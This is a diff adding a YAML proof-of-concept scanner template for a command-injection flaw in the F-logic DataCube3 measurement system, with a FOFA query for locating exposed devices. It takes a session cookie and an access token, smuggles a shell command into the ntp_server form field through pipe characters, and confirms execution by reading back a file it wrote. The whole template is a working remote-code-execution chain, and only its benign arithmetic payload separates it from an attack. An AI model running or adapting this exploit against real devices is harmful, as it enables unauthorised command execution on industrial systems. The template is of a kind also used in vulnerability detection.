@@ -1,0 +1,38 @@
+id: poc-yaml-f-logic-datacube3-rce
+info:
+  name: F-logic DataCube3测量系统-RCE
+  severity: critical
+  tags:
+  - 命令注入
+  finger: datacube3
+  fofa: title=="DataCube3"
+variables:
+  filename: to_lower(random_str(6))
+  t1: random_int(100000,999000)
+  t2: random_int(100,1000)
+  t3: t1 - t2
+requests:
+- method: GET
+  path: /admin/setting_photo.php
+  expression: status_code == 302 && contains(body,"accesstime")
+  output:
+  - regex_match(headers,`SESS_IDS=(?P<cookie>[a-z0-9A-Z]+);`)
+  - regex_match(body,`name="accesstime" value="(?P<accesstime>.*?)"`)
+- method: POST
+  path: /admin/config_time_sync.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: SESS_IDS={{.cookie}}
+  data: accesstime={{.accesstime}}&execute=&ntp_enable=&ntp_server=127.0.0.1|expr
+    {{.t1}} - {{.t2}} > {{.filename}}.txt|&ntp_retry_count=1
+  expression: status_code == 302
+- method: GET
+  path: /admin/{{.filename}}.txt
+  headers:
+    Cookie: SESS_IDS={{.cookie}}
+  expression: 'status_code == 200 &&
+
+    trim(body) == t3
+
+    '
+transport: http
